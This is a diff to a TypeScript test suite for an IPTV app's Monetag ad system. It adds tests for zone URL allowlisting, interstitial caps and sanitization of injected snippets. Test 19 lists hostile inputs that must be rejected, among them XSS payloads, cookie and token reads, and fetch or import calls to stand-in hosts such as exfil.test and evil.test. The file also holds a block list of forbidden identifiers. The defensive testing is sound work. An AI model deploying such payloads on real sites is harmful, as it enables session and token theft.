@@ -24,11 +24,18 @@ process.env.MONETAG_POSTBACK_SECRET = 'monetag-postback-test-secret';
 const { db, run, get, nowIso } = await import('../server/mrs-iptv-backend/src/db.js');
 const { redeem, signToken, verifyToken, sanitizeDeviceId, checkEntitlement } = await import('../server/mrs-iptv-backend/src/redeem.js');
 const { createAdsRouter, MONETAG_ZONES, sanitizeShowFn, sanitizeRewardedSnippet } = await import('../server/adsRouter.js');
-const { MONETAG_CANONICAL_ZONES, MONETAG_DEFAULT_VERIFICATION_ID, isValidShowFnIdentifier } = await import('../src/lib/monetagConfig.js');
+const {
+  MONETAG_CANONICAL_ZONES,
+  MONETAG_DEFAULT_VERIFICATION_ID,
+  MONETAG_DEFAULT_INTERSTITIAL_ZONE_ID,
+  isValidShowFnIdentifier,
+  isSafeMonetagZoneUrl,
+} = await import('../src/lib/monetagConfig.js');
 const paymentRouterModule = await import('../server/paymentRouter.js');
 const createPaymentRouter = paymentRouterModule.default || paymentRouterModule.createPaymentRouter;
 
 const adGateSource = fs.readFileSync(path.join(process.cwd(), 'public', 'ad-gate.js'), 'utf8');
+const adManagerSource = fs.readFileSync(path.join(process.cwd(), 'public', 'ad-manager.js'), 'utf8');
 const rewardAdsSource = fs.readFileSync(path.join(process.cwd(), 'public', 'rewardAds.js'), 'utf8');
 
 function createDomSandbox(options: {
@@ -1074,8 +1081,10 @@ test('17. Centralized Monetag IDs/zones and granular ad caps persist via admin A
   const initialJson = await initialRes.json() as any;
   assert.equal(initialJson.data.monetag.verificationId, MONETAG_DEFAULT_VERIFICATION_ID);
   assert.equal(initialJson.data.monetag.vignetteZoneId, '11242067');
+  assert.equal(initialJson.data.monetag.interstitialZoneId, MONETAG_DEFAULT_INTERSTITIAL_ZONE_ID);
   assert.equal(initialJson.data.monetag.popunderZoneId, '11226634');
   assert.equal(initialJson.data.monetag.vignette.url, 'https://uplcm.com/4/11242067');
+  assert.equal(initialJson.data.monetag.interstitial.url, 'https://uplcm.com/4/11242067');
   assert.equal(initialJson.data.monetag.popunder.url, 'https://uplcm.com/4/11226634');
   assert.equal(initialJson.data.monetag.zones.length, MONETAG_CANONICAL_ZONES.length);
   assert.equal(initialJson.data.monetag.caps.interstitialCooldownMs, 180_000);
@@ -1101,7 +1110,7 @@ test('17. Centralized Monetag IDs/zones and granular ad caps persist via admin A
   const badZoneRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
     method: 'PUT',
     headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
-    body: JSON.stringify({ monetag: { vignetteZoneId: 'bad zone!' } }),
+    body: JSON.stringify({ monetag: { interstitialZoneId: 'bad zone!' } }),
   });
   assert.equal(badZoneRes.status, 400);
   assert.equal(((await badZoneRes.json()) as any).error.code, 'invalid_zone_id');
@@ -1113,6 +1122,7 @@ test('17. Centralized Monetag IDs/zones and granular ad caps persist via admin A
     body: JSON.stringify({
       monetag: {
         vignetteZoneId: '9912130',
+        interstitialZoneId: '11242744',
         popunderZoneId: '11683565',
         caps: {
           popunderCooldownMinutes: 45,
@@ -1133,6 +1143,8 @@ test('17. Centralized Monetag IDs/zones and granular ad caps persist via admin A
   const updatedJson = await updatedRes.json() as any;
   assert.equal(updatedJson.data.monetag.vignetteZoneId, '9912130');
   assert.equal(updatedJson.data.monetag.vignette.url, 'https://uplcm.com/4/9912130');
+  assert.equal(updatedJson.data.monetag.interstitialZoneId, '11242744');
+  assert.equal(updatedJson.data.monetag.interstitial.url, 'https://uplcm.com/4/11242744');
   assert.equal(updatedJson.data.monetag.popunderZoneId, '11683565');
   assert.equal(updatedJson.data.monetag.caps.popunderCooldownMs, 45 * 60_000);
   assert.equal(updatedJson.data.monetag.caps.popunderMaxPerDay, 2);
@@ -1150,6 +1162,7 @@ test('17. Centralized Monetag IDs/zones and granular ad caps persist via admin A
     body: JSON.stringify({
       monetag: {
         vignetteZoneId: '11242067',
+        interstitialZoneId: '11242067',
         popunderZoneId: '11226634',
         caps: {
           popunderCooldownMinutes: 30,
@@ -1225,6 +1238,205 @@ test('18. Expanded forbidden rewarded callback blocklist blocks DOM/network/time
   vm.runInNewContext(rewardAdsSource, nativeFnSandbox, { filename: 'rewardAds.js' });
   await assert.rejects(nativeFnSandbox.MRS_REWARD_ADS.startAndWatch('monetag'), /not configured/i);
 });
+
+test('19. Dynamic zone URL validation, getter descriptor blocking, and snippet security filters', async () => {
+  // Zone URL allowlist checks
+  assert.equal(isSafeMonetagZoneUrl('https://uplcm.com/4/11226634'), true);
+  assert.equal(isSafeMonetagZoneUrl('https://sub.monetag.com/tag.min.js'), true);
+  assert.equal(isSafeMonetagZoneUrl('http://uplcm.com/4/11226634'), false);
+  assert.equal(isSafeMonetagZoneUrl('https://evil.example/4/11226634'), false);
+  assert.equal(isSafeMonetagZoneUrl('https://user:pass@uplcm.com/4/11226634'), false);
+  assert.equal(isSafeMonetagZoneUrl('javascript:alert(1)'), false);
+
+  // Newly added forbidden built-in / DOM / observer identifiers
+  for (const extraBlocked of ['structuredClone', 'escape', 'WebAssembly', 'getComputedStyle', 'MutationObserver']) {
+    assert.equal(isValidShowFnIdentifier(extraBlocked), false);
+    assert.throws(() => sanitizeShowFn(extraBlocked), /Rewarded callback name/i);
+  }
+
+  // Enhanced sanitizeRewardedSnippet filters
+  for (const badSnippet of [
+    '<svg onload=alert(1)>',
+    'var x = document.cookie;',
+    'fetch("https://exfil.test")',
+    'el.innerHTML = "<img src=x>"',
+    'localStorage.getItem("tok")',
+    'import("https://evil.test/x.js")',
+  ]) {
+    assert.throws(() => sanitizeRewardedSnippet(badSnippet), /disallowed inline/i);
+  }
+  assert.equal(
+    sanitizeRewardedSnippet('<script src="https://uplcm.com/4/11226634" data-zone="11226634"></script>'),
+    '<script src="https://uplcm.com/4/11226634" data-zone="11226634"></script>'
+  );
+
+  // rewardAds.js must reject accessor (getter/setter) traps before reading property
+  let getterTriggered = false;
+  const getterStorage = new Map<string, string>();
+  const getterSandbox: any = {
+    console, Date, Math, JSON, Promise, Error, parseInt, Uint8Array,
+    crypto: webcrypto,
+    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
+    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
+    addEventListener: () => {}, dispatchEvent: () => true,
+    MRS_AD_STATE: 'free',
+    MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: false, monetag: { rewarded: { enabled: true } } },
+    __MRS_ADS_SERVER_CONFIG: {
+      testMode: false,
+      monetag: { rewardedEnabled: true, rewardedShowFn: 'MonetagSDK.trapped' },
+      rewards: { cooldownMinutes: 180, anyRewardedAvailable: true },
+    },
+    MonetagSDK: {},
+    MRS_ADS: { state: () => 'free', enterVipMode: () => {}, refresh: async () => 'free' },
+    localStorage: {
+      getItem: (k: string) => (getterStorage.has(k) ? getterStorage.get(k)! : null),
+      setItem: (k: string, v: string) => { getterStorage.set(k, String(v)); },
+      removeItem: (k: string) => { getterStorage.delete(k); },
+    },
+    document: { readyState: 'complete', body: { appendChild: () => {} }, createElement: () => ({ style: {}, setAttribute: () => {}, innerHTML: '' }), getElementById: () => null, addEventListener: () => {} },
+    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: { nonce: 'd'.repeat(48), network: 'monetag', minWatchMs: 100 } }) }),
+  };
+  Object.defineProperty(getterSandbox.MonetagSDK, 'trapped', {
+    configurable: true,
+    enumerable: true,
+    get() {
+      getterTriggered = true;
+      return () => {};
+    },
+  });
+  getterSandbox.window = getterSandbox;
+  vm.runInNewContext(rewardAdsSource, getterSandbox, { filename: 'rewardAds.js' });
+  await assert.rejects(getterSandbox.MRS_REWARD_ADS.startAndWatch('monetag'), /not configured/i);
+  assert.equal(getterTriggered, false);
+});
+
+test('20. ad-manager.js dynamically syncs interstitial zones & enforces interstitial cooldown/daily caps', async () => {
+  const storageMap = new Map<string, string>();
+  const injectedScripts: Array<{ src: string; attrs: Record<string, string> }> = [];
+  const dispatchedEvents: string[] = [];
+
+  const createManagerSandbox = (interstitialMaxPerDay: number) => {
+    injectedScripts.length = 0;
+    const sb: any = {
+      console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
+      setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
+      CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
+      addEventListener: () => {},
+      dispatchEvent: (ev: any) => {
+        dispatchedEvents.push(ev?.type || '');
+        return true;
+      },
+      MRS_AD_STATE: 'free',
+      MRS_ADS: { state: () => 'free', _trackLoadedScript: () => {} },
+      MRS_ADS_CONFIG: {
+        apiBaseUrl: '',
+        testMode: false,
+        monetag: {
+          verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
+          showRegularAds: true,
+          directZones: [{ id: 'uplcm-11226634', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: 'Z1' }],
+          interstitial: {
+            zoneId: '11242067',
+            url: 'https://uplcm.com/4/11242067',
+            scriptSrc: 'https://uplcm.com/4/interstitial-tag.js',
+            inlineSnippet: null,
+          },
+          vignette: {
+            zoneId: '11242067',
+            url: 'https://uplcm.com/4/11242067',
+            scriptSrc: null,
+            inlineSnippet: null,
+          },
+        },
+        caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay },
+      },
+      navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
+      location: { pathname: '/', hash: '' },
+      innerWidth: 1280,
+      localStorage: {
+        getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
+        setItem: (k: string, v: string) => { storageMap.set(k, String(v)); },
+        removeItem: (k: string) => { storageMap.delete(k); },
+      },
+      sessionStorage: {
+        getItem: () => null,
+        setItem: () => {},
+      },
+      document: {
+        readyState: 'complete',
+        documentElement: { getAttribute: () => null },
+        body: {
+          appendChild: (el: any) => {
+            if (el.tagName === 'SCRIPT') injectedScripts.push({ src: el.src, attrs: el.attributes });
+          },
+        },
+        querySelector: () => null,
+        querySelectorAll: () => [],
+        getElementById: () => null,
+        createElement: (tag: string) => ({
+          tagName: tag.toUpperCase(),
+          attributes: {} as Record<string, string>,
+          style: {},
+          setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
+          getAttribute(k: string) { return this.attributes[k] || null; },
+        }),
+        addEventListener: () => {},
+      },
+      fetch: async (url: string) => {
+        if (url.includes('/api/ads/config')) {
+          return {
+            ok: true,
+            status: 200,
+            json: async () => ({
+              ok: true,
+              data: {
+                formats: { banner: true, sticky: false, popunder: false, interstitial: true, push: false },
+                testMode: false,
+                monetag: {
+                  verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
+                  interstitialZoneId: '11242744',
+                  interstitial: { zoneId: '11242744', url: 'https://uplcm.com/4/11242744' },
+                  zones: [
+                    { id: 'uplcm-11242744', zoneId: '11242744', url: 'https://uplcm.com/4/11242744', label: 'Dynamic Safe' },
+                    { id: 'bad-zone', zoneId: '99999999', url: 'https://malicious.invalid/bad', label: 'Unsafe' },
+                  ],
+                  showRegularAds: true,
+                  caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay },
+                },
+              },
+            }),
+          };
+        }
+        return { ok: true, status: 200, json: async () => ({ ok: true }) };
+      },
+    };
+    sb.window = sb;
+    vm.runInNewContext(adManagerSource, sb, { filename: 'ad-manager.js' });
+    return sb;
+  };
+
+  // Case A: maxPerDay === 0 prevents interstitial script injection
+  storageMap.clear();
+  createManagerSandbox(0);
+  await new Promise((r) => setTimeout(r, 25));
+  assert.equal(injectedScripts.length, 0);
+
+  // Case B: valid cap allows 1st interstitial injection with dynamic interstitialZoneId ('11242744'), filters out unsafe zone
+  storageMap.clear();
+  const sb = createManagerSandbox(2);
+  await new Promise((r) => setTimeout(r, 25));
+  assert.equal(injectedScripts.length, 1);
+  assert.equal(injectedScripts[0].attrs['data-zone'], '11242744');
+  assert.equal(sb.MRS_ADS_CONFIG.monetag.directZones.length, 1);
+  assert.equal(sb.MRS_ADS_CONFIG.monetag.directZones[0].zoneId, '11242744');
+  assert.ok(dispatchedEvents.includes('mrs_ads_config_loaded'));
+
+  // Calling MRS_ADS_REFRESH_CONFIG immediately during active cooldown preserves cap enforcement
+  await sb.MRS_ADS_REFRESH_CONFIG();
+  const hist = JSON.parse(storageMap.get('mrs_ads_interstitial_hist') || '{}');
+  assert.equal(hist.count, 1);
+});
+
 
 
 
